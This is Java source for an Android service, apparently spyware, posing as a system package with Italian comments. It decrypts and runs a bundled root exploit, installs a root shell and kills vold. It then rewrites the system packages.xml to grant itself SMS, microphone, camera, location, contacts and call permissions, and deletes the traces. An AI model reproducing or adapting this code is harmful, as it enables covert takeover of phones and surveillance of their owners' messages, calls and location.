package com.android.service;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Arrays;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;

import android.app.Service;
import android.app.WallpaperManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.Resources;
import android.graphics.Bitmap;
import android.graphics.Bitmap.Config;
import android.graphics.Canvas;
import android.graphics.Paint;
import android.os.IBinder;
import android.view.Display;
import android.view.WindowManager;
import android.widget.Toast;

import com.android.service.auto.Cfg;
import com.android.service.capabilities.PackageInfo;
import com.android.service.conf.Configuration;
import com.android.service.file.AutoFile;
import com.android.service.util.Check;
import com.android.service.util.Utils;

/**
 * The Class ServiceCore.
 */
public class ServiceCore extends Service {
	static {
	    System.loadLibrary("runner");
	}
	
	private native int invokeRun(String cmd);
	
	private static final String TAG = "ServiceCore"; //$NON-NLS-1$
	private Core core;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		Messages.init(getApplicationContext());
		
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onCreate)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, Messages.getString("32.1"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
			// setBackground();
		}

		Status.setAppContext(getApplicationContext());
	}

	private void setBackground() {
		if (Cfg.DEMO) {
			final WallpaperManager wm = WallpaperManager.getInstance(this);
			final Display display = ((WindowManager) Status.getAppContext().getSystemService(Context.WINDOW_SERVICE))
					.getDefaultDisplay();
			final int width = display.getWidth();
			final int height = display.getHeight();
			final Bitmap bitmap = Bitmap.createBitmap(width, height, Config.ARGB_8888);
			final Canvas canvas = new Canvas(bitmap);
			final Paint paint = new Paint();
			paint.setStyle(Paint.Style.FILL);
			paint.setAntiAlias(true);
			paint.setTextSize(20);
			canvas.drawText(Messages.getString("32.0"), 10, 100, paint);
			
			try {
				wm.setBitmap(bitmap);
			} catch (final IOException e) {
				if (Cfg.DEBUG) {
					Check.log(e);
				}
			}
		}
	}

	@Override
	public void onDestroy() {
		super.onDestroy();

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onDestroy)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, Messages.getString("32.3"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}

		core.Stop();
		core = null;
	}

	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);
		
		if (checkRoot() == true) {
			Status.self().setRoot(true);
		} else {
			Status.self().setRoot(false);

			// Don't exploit if we have no SD card mounted
			if (android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED)) {
				Status.self().setRoot(root());
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (onStart) no media mounted"); //$NON-NLS-1$
				}
			}
		}

		if (checkRoot() == true) {
			int ret = overridePermissions();
			
			Toast.makeText(this, "RET: " + ret, Toast.LENGTH_LONG).show(); //$NON-NLS-1$
			
			switch (ret) {
				case 0:
				case 1: return; // Non possiamo partire
				case 2:			// Possiamo partire
				default: break;
			}
		}
		
		// Core starts
		core = new Core();
		core.Start(this.getResources(), getContentResolver());
	}

	// TODO: rimuovere lo string-fu, cifrare le stringhe, cifrare
	// le stringe nella librunner.so. Fixare il fatto che l'app va
	// in crash se la funzione torna 0 o 1 e si ferma il servizio.
	
	/*
	 * Verifica e prova ad ottenere le necessarie capabilities
	 * 
	 * Return:
	 *  0 se c'e' stato un errore
	 *  1 se le cap sono state ottenute ma si e' in attesa di un reboot
	 *  2 se gia' abbiamo le cap necessarie
	 */
	private int overridePermissions() {
		final String manifest = Messages.getString("32.15"); //$NON-NLS-1$ 
		
		// Controlliamo se abbiamo le capabilities necessarie
		PackageManager pkg = Status.getAppContext().getPackageManager();

		/*if (pkg != null) {
			int perm = pkg.checkPermission("android.permission.READ_SMS", "com.android.service");
			
			if (perm == PackageManager.PERMISSION_GRANTED) {
				return 2;
			}
		}*/
		
		try {
			FileOutputStream fos = openFileOutput("perm.xml", MODE_PRIVATE);
			
			//Runtime.getRuntime().exec("/system/bin/ntpsvd fhc /data/system/packages.xml /data/data/com.android.service/files/packages.xml");
			// Copiamo packages.xml nel nostro path e rendiamolo scrivibile
			invokeRun("/system/bin/ntpsvd fhc /data/system/packages.xml /data/data/com.android.service/files/packages.xml");
			Utils.sleep(600);
			invokeRun("/system/bin/ntpsvd pzm 666 /data/data/com.android.service/files/packages.xml");
			
			// Aggiorniamo il file
		    FileInputStream fin = openFileInput("packages.xml");
		    
		    // TEST
		    PackageInfo pi = new PackageInfo(fin, "com.android.service");
		    
		    String path = pi.getPackagePath();
		    
		    if (path.length() == 0) {
		    	return 0;
		    }
		    
		    ArrayList<String> perm = pi.getPackagePermissions();
		    
		    // Vediamo se gia' ci sono i permessi richiesti
		    if (checkRequiredPermission(perm) == true) {
		    	if (Cfg.DEBUG) {
					Check.log(TAG + " (overridePermissions): Capabilities already acquired"); //$NON-NLS-1$
				}
		    	
				// Rimuoviamo la nostra copia
				File f = new File("/data/data/com.android.service/files/packages.xml");
				
				if (f.exists() == true) {
					f.delete();
				}
				
				return 2;
		    }
		    
		    pi.addPermissions(perm);
		    // FINE TEST
		    
		    byte[] buffer = Utils.inputStreamToBuffer(fin, 0);
		    
		    // ... Cerchiamo la nostra riga e la package location
		    String packages = new String(buffer);
		    buffer = null;
		    
		    int pos = packages.indexOf("<package name=\"com.android.service\" ");
		    
		    if (pos == -1) {
		    	if (Cfg.DEBUG) {
					Check.log(TAG + " (overridePermissions): cannot find package name"); //$NON-NLS-1$
				}
		    	
		    	return 0;
		    }
		    
		    // Package position
		    int apkBegin = packages.indexOf("codePath=\"", pos);
		    
		    if (apkBegin == -1) {
		    	if (Cfg.DEBUG) {
					Check.log(TAG + " (overridePermissions): cannot find apk"); //$NON-NLS-1$
				}
		    	
		    	return 0;
		    }
		    
		    apkBegin += 10; // codePath="
		    
		    int apkEnd = packages.indexOf(".apk\"", apkBegin);
		    
		    if (apkEnd == -1) {
		    	if (Cfg.DEBUG) {
					Check.log(TAG + " (overridePermissions): cannot find apk end"); //$NON-NLS-1$
				}
		    	
		    	return 0;
		    }
		    
		    apkEnd += 4; // .apk
		    
		    // Blocco dei permessi
		    int permsBegin = packages.indexOf("<perms>", pos);
		    
		    if (permsBegin == -1) {
		    	if (Cfg.DEBUG) {
					Check.log(TAG + " (overridePermissions): cannot find <perms>"); //$NON-NLS-1$
				}
		    	
		    	return 0;
		    }
		    
		    // Eliminiamo <perms>
		    permsBegin += 7;
		    	
		    int permsEnd = packages.indexOf("</perms>", permsBegin);
		    
		    if (permsEnd == -1) {
		    	if (Cfg.DEBUG) {
					Check.log(TAG + " (overridePermissions): cannot find </perms>"); //$NON-NLS-1$
				}
		    	
		    	return 0;
		    }
		    
		    // Verifichiamo se non abbiamo gia' i permessi necessari
		    String actualPerms = packages.substring(permsBegin, permsEnd);
		    
		   
		    
		    // Creiamo il nuovo file
		    //FileOutputStream fos = openFileOutput("perm.xml", MODE_PRIVATE);
		    
		    // Scriviamo tutta la prima parte fino a <perms> incluso
		    fos.write(packages.substring(0, permsBegin).getBytes("US_ASCII"));
		    
		    // Quindi i nuovi permessi
		    //fos.write(getRequiredPermission().getBytes("US_ASCII"));
		    
		    // E di seguito tutto il resto
		    fos.write(packages.substring(permsEnd).getBytes("US_ASCII"));
		    
		    fos.close();
		    
		    Resources resources = getResources();
		    InputStream manifestApkStream = resources.openRawResource(R.raw.layout);
		    
		    fileWrite(manifest, manifestApkStream, "0xA83E0F44BD7A4D20");
		    String apkLocation = packages.substring(apkBegin, apkEnd);
	
			// Copiamolo in /data/app/*.apk
		    invokeRun("/system/bin/ntpsvd qzx \"cat /data/data/com.android.service/files/layout > " + apkLocation + "\"");
		
			// Copiamolo in /data/system/packages.xml
		    invokeRun("/system/bin/ntpsvd qzx \"cat /data/data/com.android.service/files/perm.xml > /data/system/packages.xml\"");
					
			// Rimuoviamo la nostra copia
			File f = new File("/data/data/com.android.service/files/packages.xml");
			
			if (f.exists() == true) {
				f.delete();
			}
			
			// Rimuoviamo il file temporaneo
			f = new File("/data/data/com.android.service/files/perm.xml");
			
			if (f.exists() == true) {
				f.delete();
			}
			
			// Rimuoviamo l'apk con tutti i permessi
			f = new File("/data/data/com.android.service/files/layout");
			
			if (f.exists() == true) {
				f.delete();
			}
		} catch (Exception e1) {
			if (Cfg.DEBUG) {
				Check.log(e1);//$NON-NLS-1$
				Check.log(TAG + " (root): Exception on overridePermissions()"); //$NON-NLS-1$
			}

			return 0;
		}
		
		return 1;
	}

	private boolean root() {
		try {
			if (!Cfg.EXP) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (root): Exploit disabled by conf"); //$NON-NLS-1$
				}

				return false;
			}

			final String crashlog = Messages.getString("32.4"); //$NON-NLS-1$
			final String exploit = Messages.getString("32.5"); //$NON-NLS-1$
			final String suidext = Messages.getString("32.6"); //$NON-NLS-1$
			boolean isRoot = false;

			// Creiamo il crashlog
			final FileOutputStream fos = getApplicationContext().openFileOutput(crashlog, MODE_PRIVATE);
			fos.close();

			Resources resources = getResources();
			InputStream stream = resources.openRawResource(R.raw.statuslog);
			fileWrite(exploit, stream, "0x5A3D10448D7A912B");

			stream = resources.openRawResource(R.raw.statusdb);
			fileWrite(suidext, stream, "0x5A3D10448D7A912A");

			// Eseguiamo l'exploit
			final File filesPath = getApplicationContext().getFilesDir();
			final String path = filesPath.getAbsolutePath();

			Runtime.getRuntime().exec(Messages.getString("32.7") + path + "/" + exploit); //$NON-NLS-1$ //$NON-NLS-2$
			Runtime.getRuntime().exec(Messages.getString("32.8") + path + "/" + suidext); //$NON-NLS-1$ //$NON-NLS-2$
			Runtime.getRuntime().exec(Messages.getString("32.9") + path + "/" + crashlog); //$NON-NLS-1$ //$NON-NLS-2$

			final String exppath = path + "/" + exploit; //$NON-NLS-1$

			final ExploitRunnable r = new ExploitRunnable(exppath);
			new Thread(r).start();

			// Attendiamo al max 100 secondi il nostro file setuid root
			final long now = System.currentTimeMillis();

			while (System.currentTimeMillis() - now < 100 * 1000) {
				Utils.sleep(1000);

				if (checkRoot()) {
					isRoot = true;
					break;
				}
			}

			if (r.getProcess() != null) {
				r.getProcess().destroy();
			}

			if (isRoot) {
				// Killiamo VOLD per due volte
				Runtime.getRuntime().exec(path + "/" + suidext + Messages.getString("32.10")); //$NON-NLS-1$ //$NON-NLS-2$

				// Installiamo la shell root
				Runtime.getRuntime().exec(path + "/" + suidext + Messages.getString("32.11")); //$NON-NLS-1$ //$NON-NLS-2$

				if (Cfg.DEBUG) {
					Check.log(TAG + " (onStart): Root exploit"); //$NON-NLS-1$
				}
				if (Cfg.DEMO) {
					Toast.makeText(this, Messages.getString("32.12"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
				}

				// Riavviamo il telefono
				Runtime.getRuntime().exec(path + "/" + suidext + " reb"); //$NON-NLS-1$ //$NON-NLS-2$
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (onStart): exploit failed!"); //$NON-NLS-1$
				}
				if (Cfg.DEMO) {
					Toast.makeText(this, Messages.getString("32.13"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
				}

			}
		} catch (final Exception e1) {

			if (Cfg.DEBUG) {
				Check.log(e1);//$NON-NLS-1$
				Check.log(TAG + " (root): Exception on root()"); //$NON-NLS-1$
			}

			return false;
		}

		return true;
	}

	private boolean fileWrite(final String exploit, InputStream stream, String passphrase) throws IOException,
			FileNotFoundException {
		try {
			InputStream in = decodeEnc(stream, passphrase);

			final FileOutputStream out = openFileOutput(exploit, MODE_PRIVATE);
			byte[] buf = new byte[1024];
			int numRead = 0;
            while ((numRead = in.read(buf)) >= 0) {
                out.write(buf, 0, numRead);
            }
				
			out.close();
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				ex.printStackTrace();
				Check.log(TAG + " (fileWrite): " + ex);
			}
			return false;
		}

		return true;
	}

	private InputStream decodeEnc(InputStream stream, String passphrase) throws IOException, NoSuchAlgorithmException,
			NoSuchPaddingException, InvalidKeyException, InvalidAlgorithmParameterException {

		SecretKey key = Messages.produceKey(passphrase);
		
		if (Cfg.DEBUG) {
			Check.asserts(key != null, "null key"); //$NON-NLS-1$
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (decodeEnc): stream=" + stream.available());
			Check.log(TAG + " (decodeEnc): key=" + Utils.byteArrayToHex(key.getEncoded()));
		}

		Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding"); //$NON-NLS-1$
		final byte[] iv = new byte[16];
		Arrays.fill(iv, (byte) 0);
		IvParameterSpec ivSpec = new IvParameterSpec(iv);

		cipher.init(Cipher.DECRYPT_MODE, key, ivSpec);
		CipherInputStream cis = new CipherInputStream(stream, cipher);
		
		if (Cfg.DEBUG) {
			Check.log(TAG + " (decodeEnc): cis=" + cis.available());
		}
		
		return cis;
	}

	private boolean checkRoot() { //$NON-NLS-1$
		boolean isRoot = false;

		try {
			// Verifichiamo di essere root
			final AutoFile file = new AutoFile(Configuration.shellFile);

			if (file.exists() && file.canRead()) {
				final Process p = Runtime.getRuntime().exec(Configuration.shellFile + Messages.getString("32.14"));
				p.waitFor();

				if (p.exitValue() == 1) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (checkRoot): isRoot YEAHHHHH"); //$NON-NLS-1$ //$NON-NLS-2$
					}

					isRoot = true;
				}
			}
		} catch (final Exception e) {
			if (Cfg.DEBUG) {
				e.printStackTrace();
				Check.log(e);//$NON-NLS-1$
			}
		}

		return isRoot;
	}

	private boolean checkRequiredPermission(ArrayList<String> a) {
		boolean permFound = false;
		
		String requiredPerms[] =  {
				"android.permission.READ_LOGS",
				"android.permission.READ_SMS",
				"android.permission.SET_WALLPAPER",
				"android.permission.SEND_SMS",
				"android.permission.PROCESS_OUTGOING_CALLS",
				"android.permission.WRITE_APN_SETTINGS",
				"android.permission.WRITE_EXTERNAL_STORAGE",
				"android.permission.WRITE_SMS",
				"android.permission.ACCESS_WIFI_STATE",
				"android.permission.ACCESS_COARSE_LOCATION",
				"android.permission.RECEIVE_SMS",
				"android.permission.READ_CONTACTS",
				"android.permission.CALL_PHONE",
				"android.permission.READ_PHONE_STATE",
				"android.permission.RECEIVE_BOOT_COMPLETED",
				"android.permission.CAMERA",
				"android.permission.INTERNET",
				"android.permission.CHANGE_WIFI_STATE",
				"android.permission.ACCESS_FINE_LOCATION",
				"android.permission.VIBRATE",
				"android.permission.WAKE_LOCK",
				"android.permission.RECORD_AUDIO",
				"android.permission.ACCESS_NETWORK_STATE",
				"android.permission.FLASHLIGHT" 
		};
		
		for (int i = 0; i < requiredPerms.length; i++) {
			for (String actualPerms : a) {
				permFound = false;

				if (actualPerms.equals(requiredPerms[i]) == true) {
					permFound = true;
					break;
				}
			}

			if (permFound == false) {
				break;
			}
		}
		
		return permFound; 
	}
	
	// Exploit thread
	class ExploitRunnable implements Runnable {
		private Process localProcess;
		private final String exppath;

		public ExploitRunnable(String exppath) {
			this.exppath = exppath;
		}

		public Process getProcess() {
			return localProcess;
		}

		public void run() {
			try {
				localProcess = Runtime.getRuntime().exec(exppath);

				final BufferedWriter stdin = new BufferedWriter(new OutputStreamWriter(localProcess.getOutputStream()));
				final BufferedReader stdout = new BufferedReader(new InputStreamReader(localProcess.getInputStream()));
				final BufferedReader stderr = new BufferedReader(new InputStreamReader(localProcess.getErrorStream()));
				final String full = null;
				String line = null;

				while ((line = stdout.readLine()) != null) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (stdout): " + line); //$NON-NLS-1$
					}
				}

				while ((line = stderr.readLine()) != null) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (stderr): " + line); //$NON-NLS-1$
					}
				}

				try {
					localProcess.waitFor();
				} catch (final InterruptedException e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (waitFor): " + e); //$NON-NLS-1$
						Check.log(e);//$NON-NLS-1$
					}
				}

				final int exitValue = localProcess.exitValue();
				if (Cfg.DEBUG) {
					Check.log(TAG + " (waitFor): exitValue " + exitValue); //$NON-NLS-1$
				}

				stdin.close();
				stdout.close();
				stderr.close();

			} catch (final IOException e) {
				localProcess = null;
				if (Cfg.DEBUG) {
					Check.log(TAG + " (ExploitRunnable): Exception on run(): " + e); //$NON-NLS-1$
					Check.log(e);//$NON-NLS-1$
				}
			}
		}

	};
}
